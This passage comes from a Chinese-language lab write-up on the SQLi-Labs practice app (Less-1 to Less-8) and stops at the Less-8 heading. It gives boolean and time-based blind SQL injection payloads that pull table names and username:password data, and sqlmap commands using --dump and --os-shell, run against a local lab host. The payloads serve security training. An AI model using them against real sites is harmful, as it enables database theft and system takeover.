+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298347704_m8m4jm.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298349206_ygxwzb.webp" loading='lazy'></p>
+<blockquote>
+<p><code>group_concat</code> 等聚合函数 → 禁止，放进去直接报错</p>
+<p>原理：当子查询出现在 group by 的字段里面，MySQL 优化器有一条规则：</p>
+<p>位于 GROUP BY 上下文中的子查询，只允许返回单行结果。一旦子查询查出多条记录，立刻抛出：Subquery returns more than 1 row</p>
+</blockquote>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298350776_2q1ova.webp" loading='lazy'></p>
+<hr>
+<table>
+<thead>
+<tr>
+<th>注入类型</th>
+<th>可用版本</th>
+<th>失效版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>floor(rand()) group by</td>
+<td>MySQL 5.5</td>
+<td>5.7 + 修复</td>
+</tr>
+<tr>
+<td>updatexml /extractvalue XPATH 报错</td>
+<td>5.5‑5.7</td>
+<td><strong>8.0.12 + 修复</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="1-1-3-布尔盲注"><a href="#1-1-3-布尔盲注" class="headerlink" title="1.1.3 布尔盲注"></a>1.1.3 布尔盲注</h3><h4 id="1-判断是否存在注入-1"><a href="#1-判断是否存在注入-1" class="headerlink" title="1. 判断是否存在注入"></a>1. 判断是否存在注入</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>字符型注入</p>
+<hr>
+<h4 id="2-判断用哪种注入"><a href="#2-判断用哪种注入" class="headerlink" title="2. 判断用哪种注入"></a>2. 判断用哪种注入</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and 1=1--+</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298352089_f5did0.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298353605_it3rdj.webp" loading='lazy'></p>
+<p>正常/异常，存在布尔盲注</p>
+<hr>
+<h4 id="3-爆数据–一次测一个字符，用二分法逼近"><a href="#3-爆数据–一次测一个字符，用二分法逼近" class="headerlink" title="3. 爆数据–一次测一个字符，用二分法逼近"></a>3. 爆数据–一次测一个字符，用二分法逼近</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr( (子查询), 第几个字符, <span class="number">1</span> )) <span class="operator">&gt;</span> N</span><br></pre></td></tr></tbody></table></figure>
+
+<p> 修改位置，爆破第 n 位：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and ascii(substr(database(),1,1))&gt;114--+		//第1位</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span><span class="comment">--+		//第2位</span></span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>真右移 low+1 </p>
+<p>假左移 high=mid  </p>
+<p>A‑Z：65‑90，a‑z：97‑122</p>
+</blockquote>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and ascii(substr(database(),1,1))&gt;114--+				// 猜库名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'security'</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span><span class="comment">--+				// 猜表名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and ascii(substr((select column_name from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">' limit 0,1),1,1))&gt;114--+				// 猜库名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span>(group_concat(username,<span class="string">':'</span>,password)) <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span><span class="comment">--+				// 猜数据</span></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="1-1-4-时间盲注"><a href="#1-1-4-时间盲注" class="headerlink" title="1.1.4 时间盲注"></a>1.1.4 时间盲注</h3><p>页面连正常/异常都分不出来，只有快慢–if(条件, 正常,sleep(5))，猜对了秒回，猜错了干等 5 秒。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+			// 猜库名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">'security'</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span><span class="comment">--+				// 猜表名</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and ascii(substr((select column_name from information_schema.columns where table_schema='</span>security<span class="string">' and table_name='</span>users<span class="string">' limit 0,1),1,1))&gt;114--+				// 猜库名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span>(group_concat(username,<span class="string">':'</span>,password)) <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">114</span><span class="comment">--+				// 猜数据</span></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="1-1-5-sqlmap"><a href="#1-1-5-sqlmap" class="headerlink" title="1.1.5 sqlmap"></a>1.1.5 sqlmap</h3><p>核心参数</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#基础扫描</span><br><span class="line"><span class="operator">-</span>u "url"                     # 指定<span class="keyword">GET</span>目标地址</span><br><span class="line"><span class="comment">--batch                      # 自动选择默认，跳过交互</span></span><br><span class="line"><span class="operator">-</span>p id                        # 只检测id参数</span><br><span class="line"><span class="comment">--dbms mysql                 # 指定数据库为mysql</span></span><br><span class="line"><span class="comment">--technique=U/E/B/T         # 限定注入类型 U联合 E报错 B布尔 T时间盲注</span></span><br><span class="line"><span class="comment">--level 3                    # 扫描等级</span></span><br><span class="line"></span><br><span class="line">#库查询</span><br><span class="line"><span class="comment">--dbs                        # 列出全部数据库</span></span><br><span class="line"><span class="comment">--current-db                 # 获取当前数据库</span></span><br><span class="line"><span class="comment">--users                      # 查询数据库用户</span></span><br><span class="line"><span class="comment">--current-user               # 查询当前数据库用户</span></span><br><span class="line"></span><br><span class="line">#表、字段查询</span><br><span class="line"><span class="operator">-</span>D security <span class="comment">--tables         # 查询security库所有表</span></span><br><span class="line"><span class="operator">-</span>D security <span class="operator">-</span>T users <span class="comment">--columns  # 查询users表所有字段</span></span><br><span class="line"><span class="operator">-</span>D security <span class="operator">-</span>T users <span class="operator">-</span>C username,password <span class="comment">--dump #导出指定字段数据</span></span><br><span class="line"></span><br><span class="line">#POST请求</span><br><span class="line"><span class="comment">--data "uname=admin"         # 设置post提交参数</span></span><br><span class="line"><span class="operator">-</span>r post.txt                  # 读取burp数据包文件</span><br><span class="line"><span class="comment">--cookie="xxx"               # 携带cookie</span></span><br><span class="line"></span><br><span class="line">#高级功能</span><br><span class="line"><span class="comment">--hex                        # 十六进制导出，防止中文乱码</span></span><br><span class="line"><span class="comment">--sql-shell                  # 获取mysql查询shell</span></span><br><span class="line"><span class="comment">--os-shell                   # 获取系统shell</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 检测注入点</span><br><span class="line">sqlmap <span class="operator">-</span>u "http://&lt;目标&gt;" <span class="comment">--batch</span></span><br><span class="line"></span><br><span class="line"># <span class="number">1.</span> 爆所有数据库</span><br><span class="line">sqlmap <span class="operator">-</span>u "http://&lt;目标&gt;" <span class="comment">--batch --dbms=mysql --dbs</span></span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span> 爆指定库的表</span><br><span class="line">sqlmap <span class="operator">-</span>u "http://&lt;目标&gt;" <span class="comment">--batch -D security --tables</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span> 爆指定表的字段</span><br><span class="line">sqlmap <span class="operator">-</span>u "http://&lt;目标&gt;" <span class="comment">--batch -D security -T users --columns</span></span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span> 导出数据</span><br><span class="line">sqlmap <span class="operator">-</span>u "http://&lt;目标&gt;" <span class="comment">--batch -D security -T users -C</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h4 id="1-检测注入点"><a href="#1-检测注入点" class="headerlink" title="1. 检测注入点"></a>1. 检测注入点</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1"</span> --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298355022_d1arca.webp" loading='lazy'></p>
+<hr>
+<h4 id="2-查当前数据库"><a href="#2-查当前数据库" class="headerlink" title="2. 查当前数据库"></a>2. 查当前数据库</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1"</span> --current-db --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298356859_t893i2.webp" loading='lazy'></p>
+<p><code>security</code></p>
+<h4 id="3-查-security-库里面所有表"><a href="#3-查-security-库里面所有表" class="headerlink" title="3. 查 security 库里面所有表"></a>3. 查 security 库里面所有表</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1"</span> -D security --tables --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298358861_kgkcon.webp" loading='lazy'></p>
+<p>表名：<code>emails,referers,uagents,users</code></p>
+<h4 id="4-查-users-表里字段名"><a href="#4-查-users-表里字段名" class="headerlink" title="4. 查 users 表里字段名"></a>4. 查 users 表里字段名</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1"</span> -D security -T <span class="built_in">users</span> --columns --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298360655_6mfxq4.webp" loading='lazy'></p>
+<p>得到字段：<code>id, username, password</code></p>
+<h4 id="5-导出-username-和-password-的全部数据"><a href="#5-导出-username-和-password-的全部数据" class="headerlink" title="5. 导出 username 和 password 的全部数据"></a>5. 导出 username 和 password 的全部数据</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.2.101:81/sql/sqli-labs-master/Less-1/?id=1"</span> -D security -T <span class="built_in">users</span> -C username,password --dump --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298362854_0xoxjk.webp" loading='lazy'></p>
+<hr>
+<h3 id="1-1-6-POST注入（表单登录框，无url参数）"><a href="#1-1-6-POST注入（表单登录框，无url参数）" class="headerlink" title="1.1.6 POST注入（表单登录框，无url参数）"></a>1.1.6 POST注入（表单登录框，无url参数）</h3><p>两种写法<br>写法1：<code>--data</code></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://xxx/Less‑11/"</span> --data <span class="string">"uname=admin&amp;passwd=123&amp;submit=Submit"</span> --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<p>写法2：</p>
+<ol>
+<li>burp抓到POST数据包，复制全部内容，新建文件<code>post.txt</code>保存</li>
+<li><code>-r</code>读取数据包文件</li>
+</ol>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="1-2-Less-2"><a href="#1-2-Less-2" class="headerlink" title="1.2 Less-2"></a>1.2 Less-2</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298364550_n91j5x.webp" loading='lazy'></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298366242_pg3f9r.webp" loading='lazy'></p>
+<h3 id="1-2-1-确认注入点"><a href="#1-2-1-确认注入点" class="headerlink" title="1.2.1 确认注入点"></a>1.2.1 确认注入点</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298367984_xa53xy.webp" loading='lazy'></p>
+<h3 id="1-2-2-验证闭合方式"><a href="#1-2-2-验证闭合方式" class="headerlink" title="1.2.2 验证闭合方式"></a>1.2.2 验证闭合方式</h3><p>报错，返回<code>' LIMIT 0,1</code>，说明存在数字型注入。</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h2 id="1-3-Less-3"><a href="#1-3-Less-3" class="headerlink" title="1.3 Less-3"></a>1.3 Less-3</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298370245_ifub49.webp" loading='lazy'></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="1-3-1-确认注入点"><a href="#1-3-1-确认注入点" class="headerlink" title="1.3.1 确认注入点"></a>1.3.1 确认注入点</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298371892_m6kki0.webp" loading='lazy'></p>
+<h3 id="1-3-2-验证闭合方式"><a href="#1-3-2-验证闭合方式" class="headerlink" title="1.3.2 验证闭合方式"></a>1.3.2 验证闭合方式</h3><p>报错，<code>'1'') LIMIT 0,1</code>，说明是单引号+括号闭合字符型注入</p>
+<p>验证闭合方式</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">')--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298373652_v1z2tv.webp" loading='lazy'></p>
+<p> 页面不再报错，确认闭合方式 <code>&lt;font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"&gt;')&lt;/font&gt;</code> 正确。  </p>
+<hr>
+<h2 id="1-4-Less-4"><a href="#1-4-Less-4" class="headerlink" title="1.4 Less-4"></a>1.4 Less-4</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298375395_ztgx7f.webp" loading='lazy'></p>
+<h3 id="1-4-1-确认注入点"><a href="#1-4-1-确认注入点" class="headerlink" title="1.4.1 确认注入点"></a>1.4.1 确认注入点</h3><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298377335_vjulk4.webp" loading='lazy'></p>
+<p>单引号无报错</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>"</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298379079_d8y62n.webp" loading='lazy'></p>
+<p><code>"1"") LIMIT 0,1</code>，说明是双引号+括号的字符型注入</p>
+<h3 id="1-4-2-验证闭合方式"><a href="#1-4-2-验证闭合方式" class="headerlink" title="1.4.2 验证闭合方式"></a>1.4.2 验证闭合方式</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>")--+</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298380691_a335zr.webp" loading='lazy'></p>
+<hr>
+<h2 id="1-5-Less-5"><a href="#1-5-Less-5" class="headerlink" title="1.5 Less-5"></a>1.5 Less-5</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298382169_6gwfa8.webp" loading='lazy'></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298383847_7eokcx.webp" loading='lazy'></p>
+<h3 id="1-5-1-确认注入点"><a href="#1-5-1-确认注入点" class="headerlink" title="1.5.1 确认注入点"></a>1.5.1 确认注入点</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298385745_8j935h.webp" loading='lazy'></p>
+<p><code>''1'' LIMIT 0,1</code> ，单引号字符型注入</p>
+<h3 id="1-5-2-验证闭合方式"><a href="#1-5-2-验证闭合方式" class="headerlink" title="1.5.2 验证闭合方式"></a>1.5.2 验证闭合方式</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">'--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298387724_1nwus3.webp" loading='lazy'></p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' order by 4 --+		//报错，说明字段数是3</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298389322_ylkl9n.webp" loading='lazy'></p>
+<p>没有回显，不能用联合注入❌</p>
+<h3 id="1-5-3-四种方法"><a href="#1-5-3-四种方法" class="headerlink" title="1.5.3 四种方法"></a>1.5.3 四种方法</h3><h4 id="①-有报错，可以用报错注入✅"><a href="#①-有报错，可以用报错注入✅" class="headerlink" title="① 有报错，可以用报错注入✅"></a>① 有报错，可以用报错注入✅</h4><h4 id="②-有正常-异常信号，可以用布尔盲注✅"><a href="#②-有正常-异常信号，可以用布尔盲注✅" class="headerlink" title="② 有正常/异常信号，可以用布尔盲注✅"></a>② 有正常/异常信号，可以用布尔盲注✅</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and 1=1--+</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298390878_eq6sou.webp" loading='lazy'><!-- 这是一张图片，ocr 内容为： --><br><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298392302_ae3kfq.webp" loading='lazy'></p>
+<h4 id="③-存在时间延迟，可以用时间盲注✅"><a href="#③-存在时间延迟，可以用时间盲注✅" class="headerlink" title="③ 存在时间延迟，可以用时间盲注✅"></a>③ 存在时间延迟，可以用时间盲注✅</h4><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">' and if(ascii(substr(database(),1,1))&gt;110,1,sleep(5))--+</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298393793_yx5ofh.webp" loading='lazy'><!-- 这是一张图片，ocr 内容为： --><br><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298395128_tfq5d5.webp" loading='lazy'></p>
+<h4 id="④-sqlmap"><a href="#④-sqlmap" class="headerlink" title="④ sqlmap"></a>④ sqlmap</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.2.101:81/sql/sqli-labs-master/Less-5/?id=1"</span> --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298396752_511y44.webp" loading='lazy'></p>
+<hr>
+<h2 id="1-6-Less-6"><a href="#1-6-Less-6" class="headerlink" title="1.6 Less-6"></a>1.6 Less-6</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298398902_do2eh3.webp" loading='lazy'></p>
+<h3 id="1-6-1-确认注入点"><a href="#1-6-1-确认注入点" class="headerlink" title="1.6.1 确认注入点"></a>1.6.1 确认注入点</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>"</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298400969_wsa9q0.webp" loading='lazy'></p>
+<p><code>'"1"" LIMIT 0,1'</code>，双引号注入</p>
+<h3 id="1-6-2-验证闭合方式"><a href="#1-6-2-验证闭合方式" class="headerlink" title="1.6.2 验证闭合方式"></a>1.6.2 验证闭合方式</h3><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>"--+</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>" order by 4 --+		//报错，说明字段数是3</span><br><span class="line">?id=-1" <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>没有回显，不能用联合注入❌</p>
+<h3 id="1-6-3-sqlmap-检索有哪些注入方式"><a href="#1-6-3-sqlmap-检索有哪些注入方式" class="headerlink" title="1.6.3 sqlmap 检索有哪些注入方式"></a>1.6.3 sqlmap 检索有哪些注入方式</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.2.101:81/sql/sqli-labs-master/Less-6/?id=1" --batch</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298403220_22y5dz.webp" loading='lazy'></p>
+<hr>
+<h2 id="1-7-Less-7"><a href="#1-7-Less-7" class="headerlink" title="1.7 Less-7"></a>1.7 Less-7</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298405380_jraakw.webp" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>单引号报错，只有 正常/异常 页面</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298407721_2zxia7.webp" loading='lazy'></p>
+<hr>
+<h2 id="1-8-Less-8"><a href="#1-8-Less-8" class="headerlink" title="1.8 Less-8"></a>1.8 Less-8</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/SQLi-Labs/1787298409813_vl6w59.webp" loading='lazy'></p>
